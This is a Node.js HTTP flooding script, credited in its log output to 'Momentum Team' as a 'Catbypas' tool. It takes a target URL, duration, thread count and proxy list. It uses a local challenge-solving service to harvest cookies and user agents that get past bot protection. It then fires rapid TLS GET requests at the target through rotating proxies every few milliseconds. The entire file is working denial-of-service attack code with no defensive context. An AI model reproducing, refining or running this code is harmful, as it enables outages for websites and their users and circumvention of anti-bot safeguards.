const request = require('request'),
fs = require('fs'),
{
    constants

} = require('crypto'),
http = require('http'),
tls = require('tls'),
rqJar = request.jar(),
url = require('url'),
referer = require('rand-referer'),
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);


const target = process.argv[2],
time = process.argv[3],
browser_counts = process.argv[4],
httpversion = process.argv[5],
conn_timeout = process.argv[6],
rps = process.argv[7],
proxylists = process.argv[8];

const proxylist = fs.readFileSync(proxylists,"utf-8").toString().match(/\S+/g);

var log = console.log;

global.logger = function() { 

    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {

        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        return '\x1b[0m[' + ((hour < 10) ? '0' + hour : hour) +':' +((minutes < 10) ? '0' + minutes : minutes) +':' +((seconds < 10) ? '0' + seconds : seconds) +'] ';

    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));

};


function ipconn() {
    return proxylist[Math.floor(Math.random() * proxylist.length)];

}



logger(`\x1b[91m - Browser-Engine 2022 started on \x1b[0m[\x1b[94m${target}\x1b[0m] \x1b[91musing ${browser_counts} threads.`)
logger(`\x1b[91m - Catbypas script by Momentum Team\x1b[0m`)

function start_browser() {
    var api_proxy = ipconn()
    request({
        method: "POST",
        url: "http://localhost:8191/v1",
        headers: {
            "Content-Type": "application/json",
        },

        body: JSON.stringify({
            cmd: "request.get",
            url: target,
            proxy: {
                "url": `http://${api_proxy}/`,
            },
            maxTimeout: conn_timeout,
        }),

    }, function (err, res, body){
        if(err){
            return console.log(err)

        }else{
            var rze = 0;
            var solver = JSON.parse(res.body);
            if(solver.status == 'ok'){
                var useragent = solver.solution.userAgent
                if(solver.solution.cookies == undefined){
                    console.log('no cookie found, maybe next request !')
                }

                if(solver.solution.cookies !== undefined) {
                    var cc;
                    const obj = solver.solution.cookies
                    var p = JSON.stringify(obj);
                    p = JSON.parse(p);
                    p.forEach((p) => {
                        if(p == undefined) return;
                        var cookie;
                        cookie += p.name + '=' + p.value + ';';
                        cc = cookie.replace('undefined','');

                    });

                    logger(`Proxy: ${api_proxy} solved challenge.`)
                    logger(`Proxy: ${api_proxy} Get Useragent: ${useragent} and cookie: ${cc}.`)
                    flooder(api_proxy,useragent,cc)
                }

            }else {

                return rze++
            }
        }
    })    
}


function browser_engine() {
    for(var browser_count = 0; browser_count < browser_counts; browser_count++){
        start_browser()
    }
}

setInterval(() => {
    browser_engine()
}, 25000)

function flooder(proxy, ua, cookie) {

    var br_proxie = proxy.split(':');
    var host = url.parse(target).host;
    var path = url.parse(target).path;

    setInterval( function() {


        var req = http.request({
            host: br_proxie[0],
            port: br_proxie[1],
            headers: {
                'User-Agent': ua,
                'Cookie': cookie || 'false'
            },
            jar: rqJar,
            rejectUnauthorized: false,
            method: 'CONNECT',
            path: host +':443'
        },function() {
            req.setSocketKeepAlive(true);
        });

        req.on('connect', function (res, socket, head) {
            var TlsConnection = tls.connect({
                host: host,
                ciphers: 'kEECDH+ECDSA:kEECDH:kEDH:HIGH:MEDIUM:+3DES:+SHA:!RC4:!aNULL:!eNULL:!LOW:!MD5:!EXP',
                secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method_', 'TLSv1_3_method'], 
                servername: host,
                secure: true,
                requestCert: true,
                rejectUnauthorized: false,
                sessionTimeout: 10000,
                port: 443,
                socket: socket            
            }, function () {
                for (let j = 0; j < rps; j++) {
                    TlsConnection.setKeepAlive(true, 10000)
                    TlsConnection.setTimeout(10000);
                    TlsConnection.write(`GET ${path} ${httpversion}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ${ua}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
                }
            });

            TlsConnection.on('data', (chunk) => {
                setTimeout(function() {
                    TlsConnection.destroy();
                    return delete TlsConnection;
                }, 10000);
            });

        }).end();

    },5)


}

browser_engine()
